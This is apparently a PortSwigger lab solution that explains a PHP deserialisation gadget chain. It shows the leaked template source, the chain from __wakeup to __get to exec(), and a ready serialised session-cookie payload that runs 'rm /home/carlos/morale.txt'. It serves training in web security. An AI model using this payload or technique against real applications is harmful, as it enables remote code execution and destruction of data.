# Developing a custom gadget chain for PHP deserialisation

## Description

[This lab](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization) uses a serialisation-based session mechanism. By deploying a custom gadget chain, you can exploit its insecure deserialisation to achieve remote code execution. 

## Reproduction and proof of concept

1. Log in with `wiener:peter`. The session cookie contains a serialised PHP object.

2. The website references the file `/cgi-bin/libs/CustomTemplate.php` (find in **Target** tab). Get the source code by submitting a request using the `.php~` backup file extension.

Response:

```text

Content-Type: text/plain
Set-Cookie: session=; Secure; HttpOnly; SameSite=None

<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
```

3. The `__wakeup()` magic method for a `CustomTemplate` will create a new Product by referencing the `default_desc_type` and `desc` from the `CustomTemplate`.
4. The `DefaultMap` class has the `__get()` magic method, which will be invoked if you try to read an attribute that doesn't exist for this object. This magic method invokes `call_user_func()`, which will execute any function that is passed into it via the `DefaultMap->callback` attribute. The function will be executed on the `$name`, which is the non-existent attribute that was requested.
5. This gadget chain can be exploited to invoke `exec(rm /home/carlos/morale.txt)` by passing in a `CustomTemplate` object where:

```text
CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt";
CustomTemplate->desc = DefaultMap;
DefaultMap->callback = "exec"
```

6. Follow the data flow in the source code: this will cause the `Product` constructor to try and fetch the `default_desc_type` from the `DefaultMap` object. As it doesn't have this attribute, the `__get()` method will invoke the callback `exec()` method on the `default_desc_type`, which is set to the shell command.
7. To solve the lab, Base64 and URL-encode the following serialised object, and pass it into the website via the session cookie:

```text
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
```

## Exploitability

An attacker will need to log in to `wiener:peter`; and delete the `morale.txt` file from Carlos's home directory.
